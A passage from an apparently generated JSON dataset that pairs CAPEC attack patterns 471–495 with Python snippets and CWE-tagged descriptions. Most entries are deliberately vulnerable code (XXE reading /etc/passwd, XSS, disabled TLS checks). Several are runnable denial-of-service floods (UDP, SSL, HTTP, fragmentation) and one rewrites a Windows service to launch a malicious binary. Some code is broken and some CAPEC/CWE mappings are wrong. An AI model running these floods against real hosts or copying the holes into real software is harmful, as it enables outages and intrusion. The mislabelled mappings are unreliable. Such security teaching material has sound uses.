        "description": "This Python code snippet demonstrates a scenario where an attacker can leverage SQL injection (CWE-89) to gain unauthorized access to a database and potentially execute arbitrary commands on the host system. The code connects to an SQLite database with unnecessary privileges (CWE-250) and executes a SQL query using user input without proper sanitization, making it vulnerable to SQL injection. The cursor is not closed properly, leading to a potential dangling cursor issue (CWE-619). Additionally, the code uses os.system to execute shell commands, which can be exploited to compromise the operating system. The snippet also simulates the activation of hardware debug logic (CWE-1313) by executing a shell command. This code embodies the main idea of CAPEC-642, where an attacker can expand control over the operating system from the database by exploiting various weaknesses."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "import os\nimport ctypes\n\n# Vulnerable function that loads a DLL from the current directory\n# CWE-427: Uncontrolled Search Path Element\n# CWE-426: Untrusted Search Path\n# CWE-470: Use of Externally-Controlled Input to Select Classes or Code\n\ndef load_library(library_name):\n    # Construct the full path to the library\n    library_path = os.path.join(os.getcwd(), library_name)\n    \n    # Load the library using ctypes\n    try:\n        ctypes.CDLL(library_path)\n        print(f\"Loaded library: {library_path}\")\n    except OSError as e:\n        print(f\"Failed to load library: {e}\")\n\n# Example usage\n# An attacker could place a malicious 'example.dll' in the current directory\nload_library('example.dll')",
        "description": "This Python code snippet demonstrates a vulnerable function that loads a DLL from the current directory using the `ctypes` library. The function `load_library` constructs the full path to the library by joining the current working directory with the provided library name. This approach embodies the concept of 'Search Order Hijacking' (CAPEC-471) by allowing an attacker to place a malicious DLL in the current directory, which will be loaded instead of the legitimate one. The code also touches on related CWEs: CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path), as it does not validate or control the search path for the DLL, and CWE-470 (Use of Externally-Controlled Input to Select Classes or Code), as it uses external input to determine which library to load."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    user_agent = request.headers.get('User-Agent')\n    # Exposing sensitive information (CWE-200)\n    print(f'User-Agent: {user_agent}')\n    # Crafting a response with potential XSS vulnerability (CWE-79)\n    response = f'<script>console.log(\"Browser: {user_agent}\")</script>'\n    return render_template_string(response)\n\n@app.route('/exploit')\ndef exploit():\n    # Using GET request with sensitive information (CWE-598)\n    sensitive_data = request.args.get('data')\n    # Incomplete denylist for XSS (CWE-692)\n    if '<script>' in sensitive_data:\n        return 'Blocked'\n    return f'Sensitive Data: {sensitive_data}'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web application using Flask that embodies the concept of browser fingerprinting and related vulnerabilities. The main idea is to capture the User-Agent string from the request headers to identify the browser type and version, which is then printed to the console (CWE-200). The response includes a script tag that logs the User-Agent to the browser's console, potentially leading to XSS vulnerabilities (CWE-79). Additionally, the '/exploit' route processes sensitive data via a GET request (CWE-598) and attempts to block XSS using an incomplete denylist (CWE-692). This code highlights how an attacker might gather browser information and exploit related vulnerabilities."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulate a message and a legitimate key\nmessage = b'Important transaction data'\nlegitimate_key = b'secret_key'\n\n# Generate a legitimate HMAC signature\nlegitimate_signature = hmac.new(legitimate_key, message, hashlib.sha256).hexdigest()\n\n# Attacker generates a spoofed message and signature\nspoofed_message = b'Fake transaction data'\nspoofed_key = b'fake_key'\nspoofed_signature = hmac.new(spoofed_key, spoofed_message, hashlib.sha256).hexdigest()\n\n# Vulnerable verification function\n# CWE-20: Improper Input Validation\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\ndef verify_message(message, signature, key):\n    expected_signature = hmac.new(key, message, hashlib.sha256).hexdigest()\n    return hmac.compare_digest(expected_signature, signature)\n\n# Vulnerable check: does not validate the source of the message or key\nif verify_message(spoofed_message, spoofed_signature, legitimate_key):\n    print(\"Message verified and accepted.\")\nelse:\n    print(\"Message verification failed.\")",
        "description": "This Python code snippet demonstrates a vulnerable implementation of message verification using HMAC signatures. The code simulates a scenario where an attacker generates a spoofed message and signature. The `verify_message` function is intended to verify the integrity and authenticity of the message, but it is vulnerable due to improper input validation (CWE-20), use of a potentially risky cryptographic algorithm (CWE-327), and authentication bypass by spoofing (CWE-290). Additionally, the function does not ensure the integrity of the message during transmission (CWE-924) and does not correctly specify the intended destination (CWE-941). The vulnerability allows the spoofed message to be accepted as legitimate, embodying the main idea of the CAPEC 'Signature Spoof'."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "import os\nimport hashlib\nimport base64\n\n# Simulate storing a private key insecurely\nprivate_key = 'my_private_key'\nwith open('private_key.txt', 'w') as f:\n    f.write(private_key)\n\n# Simulate an attacker stealing the private key\nwith open('private_key.txt', 'r') as f:\n    stolen_key = f.read()\n\n# Attacker uses the stolen key to sign a message\nmessage = 'Important transaction'\nsignature = base64.b64encode(hashlib.sha256((message + stolen_key).encode()).digest()).decode()\n\n# Victim verifies the signature, assuming it is from a trusted source\ntrusted_signature = signature  # In a real scenario, this would be compared to a known good signature\nif trusted_signature == signature:\n    print('Signature verified. Performing the action...')\nelse:\n    print('Signature verification failed.')",
        "description": "This Python code snippet demonstrates a scenario where an attacker steals a private key due to insufficiently protected credentials (CWE-522). The attacker then uses the stolen key to sign a message, which is subsequently trusted by the victim, leading to an authentication bypass (CWE-290). The code highlights the vulnerability of storing sensitive keys insecurely and the potential for signature spoofing by key theft, as described in the CAPEC."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulated verification function\ndef verify_signature(message, signature, key):\n    # Using a weak hash function (CWE-327)\n    expected_signature = hmac.new(key.encode(), message.encode(), hashlib.md5).hexdigest()\n    \n    # Improper verification of cryptographic signature (CWE-347)\n    if signature == expected_signature:\n        return True\n    else:\n        return False\n\n# Example usage\nmessage = 'Important message'\nkey = 'secret_key'\n\n# Adversary can generate a valid signature without knowing the key (CAPEC-151)\nforged_signature = hmac.new('wrong_key'.encode(), message.encode(), hashlib.md5).hexdigest()\n\n# This should return False, but due to weak algorithm and improper verification, it may return True\nis_valid = verify_signature(message, forged_signature, key)\nprint('Signature valid:', is_valid)",
        "description": "This Python code snippet demonstrates a vulnerability where an adversary can exploit a cryptographic weakness to generate a valid signature without knowing the key (CAPEC-151). The code uses a weak hash function (MD5) for HMAC, which is considered broken or risky (CWE-327). The `verify_signature` function improperly verifies the cryptographic signature (CWE-347). An adversary can generate a forged signature using a different key, and due to the weak algorithm and improper verification, the function may incorrectly validate the forged signature as legitimate."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulated function to verify a signature\n# CWE-347: Improper Verification of Cryptographic Signature\ndef verify_signature(message, signature, secret_key):\n    expected_signature = hmac.new(secret_key.encode(), message.encode(), hashlib.sha256).hexdigest()\n    return hmac.compare_digest(expected_signature, signature)\n\n# Simulated function to parse and display a message\n# CWE-290: Authentication Bypass by Spoofing\ndef parse_message(data_blob):\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    # CWE-300: Channel Accessible by Non-Endpoint\n    try:\n        message, signature = data_blob.split(':')\n        if verify_signature(message, signature, 'secret_key'):\n            print(f\"Message from trusted source: {message}\")\n        else:\n            print(\"Signature verification failed!\")\n    except Exception as e:\n        print(f\"Error parsing message: {e}\")\n\n# Simulated attacker creating a spoofed data blob\nattacker_message = \"Important update\"\nattacker_signature = \"fake_signature\"\nspoofed_data_blob = f\"{attacker_message}:{attacker_signature}\"\n\n# Attempt to parse and display the spoofed message\nparse_message(spoofed_data_blob)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Signature Spoofing by Misrepresentation' (CAPEC). The `verify_signature` function is intended to verify the cryptographic signature of a message (CWE-347). The `parse_message` function simulates the parsing and display of a message, but it does not correctly handle the verification process, allowing an attacker to spoof the signature (CWE-290). The code also highlights potential issues with specifying the correct destination (CWE-941), ensuring message integrity (CWE-924), and verifying the identity of communication endpoints (CWE-300). The attacker creates a spoofed data blob with a fake signature, which is then parsed and displayed by the vulnerable function, demonstrating how an attacker can misrepresent the signer's identity."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulated signed and unsigned content\nsigned_content = b'Signed content'\nunsigned_content = b'Unsigned content'\n\n# Secret key for HMAC\nsecret_key = b'secret'\n\n# Generate HMAC for signed content\nsigned_hmac = hmac.new(secret_key, signed_content, hashlib.sha256).hexdigest()\n\n# Function to verify HMAC\ndef verify_hmac(content, received_hmac):\n    calculated_hmac = hmac.new(secret_key, content, hashlib.sha256).hexdigest()\n    return hmac.compare_digest(calculated_hmac, received_hmac)\n\n# Vulnerable function that processes both signed and unsigned content\n# without proper verification\n\ndef process_content(content, received_hmac=None):\n    if received_hmac:\n        if verify_hmac(content, received_hmac):\n            print('Signed content verified and processed:', content)\n        else:\n            print('Invalid HMAC. Content rejected.')\n    else:\n        # Unsigned content is processed without verification\n        print('Unsigned content processed:', content)\n\n# Example usage\nprocess_content(signed_content, signed_hmac)  # Properly signed content\nprocess_content(unsigned_content)  # Unsigned content\n",
        "description": "This Python code snippet demonstrates a vulnerability where both signed and unsigned content are processed by the same function without proper distinction. The `process_content` function processes signed content by verifying its HMAC, but it also processes unsigned content without any verification. This embodies the CAPEC 'Signature Spoofing by Mixing Signed and Unsigned Content' by showing how an attacker could exploit the lack of proper verification for unsigned content. The related CWEs are represented as follows: CWE-347 (Improper Verification of Cryptographic Signature) is shown in the HMAC verification process, and CWE-693 (Protection Mechanism Failure) is demonstrated by the lack of a robust mechanism to differentiate and handle signed and unsigned content securely."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "import win32serviceutil\nimport win32service\nimport win32api\nimport win32con\n\n# Define the service name and the malicious binary path\nservice_name = 'MyService'\nmalicious_binary = 'C:\\malicious\\malicious.exe'\n\n# Open the service manager\nscm_handle = win32service.OpenSCManager(None, None, win32con.SC_MANAGER_ALL_ACCESS)\n\n# Open the service\nservice_handle = win32service.OpenService(scm_handle, service_name, win32service.SERVICE_ALL_ACCESS)\n\n# Change the service configuration to point to the malicious binary\nwin32service.ChangeServiceConfig(\n    service_handle,\n    win32service.SERVICE_NO_CHANGE,\n    win32service.SERVICE_NO_CHANGE,\n    win32service.SERVICE_NO_CHANGE,\n    malicious_binary,\n    None,\n    0,\n    None,\n    None,\n    None,\n    None\n)\n\n# Close the service and service manager handles\nwin32service.CloseServiceHandle(service_handle)\nwin32service.CloseServiceHandle(scm_handle)\n\nprint(f'Service {service_name} configuration modified to execute {malicious_binary}')",
        "description": "This Python code snippet demonstrates how an adversary could exploit improper access control (CWE-284) to modify the configuration of a Windows service to execute a malicious binary. The code uses the `pywin32` library to interact with the Windows Service Control Manager (SCM). It opens the SCM with full access, opens the specified service, and changes its configuration to point to a malicious executable. This represents the main idea of the CAPEC 'Modification of Windows Service Configuration' by showing how an attacker can replace a legitimate service binary with a malicious one, potentially leading to unauthorized code execution."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "import ssl\nimport socket\n\n# Create an SSL context that does not verify certificates\ncontext = ssl.create_default_context()\ncontext.check_hostname = False\ncontext.verify_mode = ssl.CERT_NONE\n\n# Connect to a server with the insecure context\nhostname = 'malicious.example.com'\nport = 443\n\nwith socket.create_connection((hostname, port)) as sock:\n    with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n        print(ssock.version())\n        # The connection is established without proper certificate validation\n        # This can allow a malicious root certificate to be trusted\n",
        "description": "This Python code snippet demonstrates a scenario where an SSL/TLS connection is established without proper certificate validation. The `ssl.create_default_context()` function is used to create an SSL context, but the `check_hostname` and `verify_mode` settings are modified to disable certificate verification. This insecure context is then used to connect to a server, potentially allowing a malicious root certificate to be trusted. This embodies the main idea of the CAPEC 'Malicious Root Certificate' by showing how improper certificate validation (CWE-295) and improper access control (CWE-284) can lead to security vulnerabilities where an adversary can exploit the system to trust a malicious certificate."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "import os\nimport subprocess\n\n# Vulnerable function that runs a command in a virtualized environment\n# without proper isolation or validation\n\ndef run_command_in_vm(command):\n    # Simulate running a command in a virtual machine\n    vm_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = vm_process.communicate()\n    return stdout, stderr\n\n# Example usage\nif __name__ == '__main__':\n    # Command to be executed in the virtual machine\n    command = 'cat /etc/passwd'\n    output, error = run_command_in_vm(command)\n    print('Output:', output.decode())\n    print('Error:', error.decode())\n\n    # Simulate escaping the virtualized environment by running a command on the host\n    host_command = 'ls /root'\n    host_output, host_error = run_command_in_vm(host_command)\n    print('Host Output:', host_output.decode())\n    print('Host Error:', host_error.decode())",
        "description": "This Python code snippet demonstrates a vulnerable function that runs commands in a virtualized environment without proper isolation or validation. The `run_command_in_vm` function uses `subprocess.Popen` to execute a given command, simulating the execution within a virtual machine. However, due to improper isolation (CWE-653) and lack of protection mechanisms (CWE-693), an attacker can escape the virtualized environment and execute commands on the host system, as shown by the `host_command` example. This represents the main idea of the CAPEC 'Escaping Virtualization', where an adversary gains unauthorized access to the host environment by exploiting vulnerabilities in the virtualized environment."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "import requests\nimport ssl\n\n# Create a custom SSL context to leave the SNI field blank (Domainless Fronting)\ncontext = ssl.create_default_context()\ncontext.check_hostname = False\ncontext.verify_mode = ssl.CERT_NONE\n\n# URL with a different domain in the Host header (Domain Fronting)\nurl = 'https://example.com/resource'\nheaders = {\n    'Host': 'malicious.com'\n}\n\n# Send the request\nresponse = requests.get(url, headers=headers, verify=False)\n\nprint(response.status_code)\nprint(response.text)",
        "description": "This Python code snippet demonstrates a simplified version of Domain Fronting and Domainless Fronting attacks. It uses the 'requests' library to send an HTTP GET request to 'https://example.com/resource' but sets the 'Host' header to 'malicious.com'. Additionally, it creates a custom SSL context that disables hostname checking and certificate verification, effectively leaving the SNI field blank. This can lead to traffic being routed to an unintended destination, embodying the main idea of CAPEC-923. The code also touches on related CWEs such as CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) and CWE-941 (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "import socket\n\n# Vulnerable server code that does not limit resource allocation\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 8080))\nserver_socket.listen(5)\n\nprint('Server is listening on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} accepted.')\n    # No limit on the number of connections or resources allocated\n    client_socket.send(b'Welcome to the vulnerable server!')\n    client_socket.close()",
        "description": "This Python code snippet represents a simple TCP server that is vulnerable to a TCP flood attack. The server listens for incoming connections on port 8080 and accepts them without any limit on the number of connections or resources allocated (CWE-770). This lack of resource allocation control can be exploited by an adversary to perform a TCP flood attack, overwhelming the server and denying legitimate users access to the service. The code does not implement any throttling or resource management, making it susceptible to denial-of-service attacks."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data (potentially from an untrusted source)\nxml_data = '''\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n'''\n\ntry:\n    # Parsing the XML without proper validation\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f\"XML parsing error: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-230 and CAPEC-231, specifically focusing on CWE-611 (Improper Restriction of XML External Entity Reference). The code parses an XML document that includes an external entity reference. The XML data is potentially from an untrusted source and is not validated against a schema, which can lead to an XML External Entity (XXE) attack. In this example, the external entity references the '/etc/passwd' file, which could expose sensitive information if processed. This code highlights the importance of proper XML validation and the risks of processing untrusted XML data without appropriate security measures."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "import random\nimport hashlib\n\n# Weak random number generator\nrandom.seed(12345)\n\n# Simulate key generation using weak random numbers\nprivate_key = random.getrandbits(256)\npublic_key = hashlib.sha256(str(private_key).encode()).hexdigest()\n\n# Simulate signing a message\nmessage = 'Important transaction'\nsignature = hashlib.sha256((message + str(private_key)).encode()).hexdigest()\n\n# Attacker can predict the private key due to weak RNG\nattacker_private_key = random.getrandbits(256)\nattacker_public_key = hashlib.sha256(str(attacker_private_key).encode()).hexdigest()\n\n# Attacker forges a signature\nforged_signature = hashlib.sha256((message + str(attacker_private_key)).encode()).hexdigest()\n\nprint(f'Original Public Key: {public_key}')\nprint(f'Original Signature: {signature}')\nprint(f'Attacker Public Key: {attacker_public_key}')\nprint(f'Forged Signature: {forged_signature}')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can predict and recreate a private key due to the use of a weak random number generator (CWE-330, CWE-1241). The code simulates the generation of a private key using a weak RNG, signs a message, and then shows how an attacker can predict the private key and forge a signature. This embodies the main idea of CAPEC 'Signature Spoofing by Key Recreation' by illustrating how cryptographic weaknesses can be exploited to mislead victims."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "import socket\nimport random\nimport threading\n\n# Function to perform UDP flood attack\ndef udp_flood(target_ip, target_port, duration):\n    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    bytes_to_send = random._urandom(1024)  # CWE-770: No limit on resource allocation\n    timeout = time.time() + duration\n    while time.time() < timeout:\n        client.sendto(bytes_to_send, (target_ip, target_port))  # CWE-406: No control of message volume\n\n# Example usage\nif __name__ == \"__main__\":\n    target_ip = \"192.168.1.1\"  # CWE-941: Incorrectly specified destination\n    target_port = 80\n    duration = 10  # Duration of the attack in seconds\n    thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))\n    thread.start()",
        "description": "This Python code snippet demonstrates a basic UDP flood attack, which is a type of denial-of-service (DoS) attack. The `udp_flood` function sends a large number of UDP packets to a specified target IP and port for a given duration. The code uses a random payload of 1024 bytes for each packet, which can overwhelm the target's network bandwidth and resources. This example embodies the main idea of CAPEC-UDP Flood by illustrating how an attacker can exploit the UDP protocol to deny legitimate users access to a service. The code also highlights related CWEs: CWE-770 (no limit on resource allocation), CWE-406 (no control of message volume), and CWE-941 (incorrectly specified destination)."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "import socket\n\n# Vulnerable server that does not limit ICMP requests\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\nserver_socket.bind(('0.0.0.0', 0))\n\nprint('Server is running and waiting for ICMP packets...')\n\ntry:\n    while True:\n        packet, addr = server_socket.recvfrom(1024)\n        print(f'Received packet from {addr}')\n        # No throttling or resource limit\nexcept KeyboardInterrupt:\n    print('Server shutting down.')\nfinally:\n    server_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that listens for ICMP packets without any resource limits or throttling, embodying the main idea of an ICMP Flood attack (CAPEC-ICMP Flood). The server uses a raw socket to receive ICMP packets and prints the source address of each packet. The code does not implement any restrictions on the number of packets it can handle, making it susceptible to a flooding attack. This demonstrates CWE-770 (Allocation of Resources Without Limits or Throttling). Additionally, the server binds to all network interfaces ('0.0.0.0'), which can be related to CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints)."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "from flask import Flask, request\nimport threading\nimport time\n\napp = Flask(__name__)\n\n# Simulate resource allocation without limits\nactive_sessions = []\n\n@app.route('/resource', methods=['GET'])\ndef allocate_resource():\n    session_id = request.args.get('session_id')\n    if session_id:\n        active_sessions.append(session_id)\n        # Simulate resource consumption\n        time.sleep(5)\n        return 'Resource allocated', 200\n    return 'Invalid session', 400\n\n# Function to simulate HTTP flood attack\ndef http_flood_attack():\n    import requests\n    while True:\n        requests.get('http://localhost:5000/resource', params={'session_id': 'attacker'})\n\nif __name__ == '__main__':\n    # Start the HTTP flood attack in a separate thread\n    attack_thread = threading.Thread(target=http_flood_attack)\n    attack_thread.start()\n    # Start the Flask application\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web service that allocates resources based on HTTP GET requests. The '/resource' endpoint simulates resource allocation without any limits, representing CWE-770 (Allocation of Resources Without Limits or Throttling). The 'http_flood_attack' function simulates an HTTP flood attack by continuously sending GET requests to the '/resource' endpoint, consuming server resources and potentially leading to a denial of service. This demonstrates the main idea of CAPEC-488 (HTTP Flood) by showing how an attacker can exploit the lack of resource limits to overwhelm the server. The code also runs the attack in a separate thread to simulate a real-world attack scenario."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "import ssl\nimport socket\nimport threading\n\n# Function to create SSL connections and flood the server\ndef ssl_flood(target_host, target_port):\n    context = ssl.create_default_context()\n    while True:\n        try:\n            with socket.create_connection((target_host, target_port)) as sock:\n                with context.wrap_socket(sock, server_hostname=target_host) as ssock:\n                    # Renegotiate SSL connection repeatedly\n                    ssock.do_handshake()\n        except Exception as e:\n            pass\n\n# Target server details\nhost = 'example.com'\nport = 443\n\n# Number of threads to simulate multiple attacking clients\nnum_threads = 100\n\n# Start multiple threads to flood the server\nthreads = []\nfor _ in range(num_threads):\n    thread = threading.Thread(target=ssl_flood, args=(host, port))\n    thread.start()\n    threads.append(thread)\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates an SSL Flood attack, where multiple threads are used to create SSL connections to a target server and repeatedly renegotiate the SSL handshake. The code leverages the `ssl` and `socket` libraries to establish secure connections and the `threading` library to simulate multiple attacking clients. The main idea is to consume the server's resources by making a large number of HTTPS requests and continuously renegotiating the SSL connection, leading to resource exhaustion and denial of service for legitimate users. This embodies the CAPEC description by exploiting the asymmetric resource consumption between the client and server during SSL handshakes. The related CWEs are represented by the lack of resource limits, insufficient resource pool, and uncontrolled resource consumption."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "import socket\n\n# Vulnerable UDP server that can be exploited for amplification attacks\nclass AmplificationServer:\n    def __init__(self, host='0.0.0.0', port=12345):\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.server_socket.bind((host, port))\n        print(f'Server listening on {host}:{port}')\n\n    def start(self):\n        while True:\n            data, addr = self.server_socket.recvfrom(1024)  # Receive request\n            print(f'Received request from {addr}')\n            response = self.generate_large_response(data)\n            self.server_socket.sendto(response, addr)  # Send amplified response\n\n    def generate_large_response(self, data):\n        # Generate a response that is much larger than the request\n        return data * 1000  # Amplification factor\n\nif __name__ == '__main__':\n    server = AmplificationServer()\n    server.start()",
        "description": "This Python code snippet represents a vulnerable UDP server that can be exploited for amplification attacks. The server listens for incoming UDP requests and responds with a much larger payload, demonstrating the concept of amplification. The `generate_large_response` method multiplies the incoming data by 1000, creating a significantly larger response. This embodies the main idea of CAPEC-130 (Amplification) and highlights related CWEs such as CWE-405 (Asymmetric Resource Consumption) and CWE-406 (Insufficient Control of Network Message Volume). An attacker can exploit this by sending small requests with a spoofed source address, causing the server to send large responses to the target, overwhelming it with traffic."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "import re\n\ndef expand_macros(data):\n    pattern = re.compile(r'\\{\\{(.*?)\\}\\}')\n    expanded_data = data\n    for _ in range(1000):  # Arbitrary large number to simulate excessive expansion\n        matches = pattern.findall(expanded_data)\n        if not matches:\n            break\n        for match in matches:\n            expanded_data = expanded_data.replace(f'{{{{{match}}}}}', match * 1000)  # Exponential growth\n    return expanded_data\n\n# Example usage\ninput_data = '{{macro}}'\ntry:\n    result = expand_macros(input_data)\n    print(f'Expanded data length: {len(result)}')\nexcept MemoryError:\n    print('MemoryError: Data expansion caused excessive memory allocation')",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Quadratic Data Expansion' (CAPEC). The `expand_macros` function takes a string with macro-like patterns (e.g., '{{macro}}') and repeatedly expands them. The expansion process is designed to simulate excessive memory allocation by replacing each macro with a significantly larger string. This can lead to a denial of service (DoS) as the memory usage grows exponentially. The code also includes a try-except block to catch potential `MemoryError` exceptions, which may occur due to the excessive memory allocation. This snippet embodies the main idea of the CAPEC by showing how an adversary could exploit macro-like substitution to cause a DoS situation."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "import re\n\ndef vulnerable_regex(input_string):\n    # CWE-1333: Inefficient Regular Expression Complexity\n    # CWE-625: Permissive Regular Expression\n    pattern = re.compile(r'(a+)+$')\n    if pattern.match(input_string):\n        return 'Match found'\n    else:\n        return 'No match'\n\n# Example of input that causes exponential blowup\ninput_string = 'a' * 30 + '!'  # This input will cause the regex to backtrack excessively\nprint(vulnerable_regex(input_string))",
        "description": "This Python code snippet demonstrates a vulnerable regular expression that can lead to exponential blowup, as described in the CAPEC. The regular expression pattern '(a+)+$' is inefficient and has exponential worst-case complexity (CWE-1333). When given a specific input designed to exploit this inefficiency, such as a long string of 'a' characters followed by a non-matching character, the regex engine will backtrack excessively, consuming significant CPU resources (CWE-400). This example highlights the importance of using efficient regular expressions to avoid uncontrolled resource consumption."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Example SOAP message with a large array declaration\nsoap_message = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <ns:largeArrayRequest xmlns:ns=\"http://example.com/\">\n         <ns:array>\n            <ns:item>1</ns:item>\n            <ns:item>2</ns:item>\n            <!-- Imagine 1,000,000 items here -->\n         </ns:array>\n      </ns:largeArrayRequest>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Parse the SOAP message\ntry:\n    root = ET.fromstring(soap_message)\n    array_elements = root.findall('.//ns:item', {'ns': 'http://example.com/'})\n    print(f\"Parsed {len(array_elements)} array elements.\")\nexcept ET.ParseError as e:\n    print(f\"Failed to parse SOAP message: {e}\")\n\n# This code does not limit the size of the array, leading to potential memory exhaustion\n# CWE-770: Allocation of Resources Without Limits or Throttling\n# CWE-1325: Improperly Controlled Sequential Memory Allocation\n# CWE-130: Improper Handling of Length Parameter Inconsistency",
        "description": "This Python code snippet demonstrates a SOAP Array Blowup attack. It constructs a SOAP message with a large array declaration and attempts to parse it using the xml.etree.ElementTree library. The code does not impose any limits on the size of the array, which can lead to memory exhaustion (CWE-770, CWE-1325). Additionally, it does not handle length parameter inconsistencies (CWE-130). This example highlights the vulnerability of web services to attacks that exploit resource allocation without proper limits."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "import socket\n\n# Create a raw socket\ns = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Function to create fragmented TCP packets\ndef create_fragmented_packet(data):\n    fragments = []\n    # Fragment the data into two parts\n    fragment1 = data[:8]  # First 8 bytes\n    fragment2 = data[8:]  # Remaining bytes\n    fragments.append(fragment1)\n    fragments.append(fragment2)\n    return fragments\n\n# Example data to be sent\ndata = b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n'\n\n# Create fragmented packets\nfragments = create_fragmented_packet(data)\n\n# Send the fragmented packets\nfor fragment in fragments:\n    s.sendto(fragment, ('target_ip', 80))\n\ns.close()",
        "description": "This Python code snippet demonstrates a basic example of a TCP fragmentation attack. It creates a raw socket and defines a function to fragment a TCP packet into two parts. The example data represents an HTTP GET request, which is then fragmented and sent to the target IP address. This approach can be used to bypass network filtering rules by pushing critical header information into the second fragment, which may not be inspected by some network controls. The code also touches on CWE-770 (resource allocation without limits) by not imposing any restrictions on the size or number of fragments, CWE-404 (improper resource shutdown) by not properly managing the socket resource, and CWE-319 (cleartext transmission) by sending sensitive data in cleartext."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "import socket\nimport random\n\n# Function to generate a large UDP packet\ndef generate_large_packet(size):\n    return b'A' * size\n\n# Function to send fragmented UDP packets\ndef send_fragmented_packets(target_ip, target_port, packet_size, num_packets):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    for _ in range(num_packets):\n        packet = generate_large_packet(packet_size)\n        sock.sendto(packet, (target_ip, target_port))\n    sock.close()\n\n# Configuration\nTARGET_IP = '192.168.1.1'\nTARGET_PORT = 12345\nPACKET_SIZE = 2000  # Larger than typical MTU to force fragmentation\nNUM_PACKETS = 1000\n\n# Execute the attack\nsend_fragmented_packets(TARGET_IP, TARGET_PORT, PACKET_SIZE, NUM_PACKETS)",
